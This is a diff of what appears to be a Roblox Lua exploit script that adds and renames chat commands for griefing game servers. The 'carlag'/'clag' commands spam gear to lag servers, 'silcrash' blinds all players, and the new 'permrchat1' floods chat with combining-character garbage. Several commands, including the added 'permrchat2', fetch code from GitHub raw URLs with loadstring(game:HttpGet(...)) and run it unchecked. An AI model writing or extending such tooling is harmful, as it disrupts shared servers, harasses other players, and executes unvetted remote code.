@@ -1264,7 +1264,7 @@ end
 if msg == prefix.."carlag" then
 game.Players:Chat("-super gear all 00000000000000000000000000000000000253519495")
 end
-if msg == prefix.."carlag" then
+if msg == prefix.."clag" then
 Chat("-super gear all 00000000000000000000000000000000000253519495")
 Chat("h \n\n\n\n\n\n\n LAGGING SERVER..... \n\n ___________________________________________ \n\n\n\n\n\n\n METHOD:Car lag")
 end
@@ -1354,6 +1354,12 @@ if msg == prefix.."silcrash" then
 game.Players:Chat("blind all")
 wait(0.25)
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
+end
+if msg == prefix.."permrchat1" then
+Chat("-spam h à¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹‡â€Šà¸à¹‡à¹‡à¹€Šaaaaaaaaa")
+end
+if msg == prefix.."permrchat2" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/permrchat2_real",true))()
 end
 
 
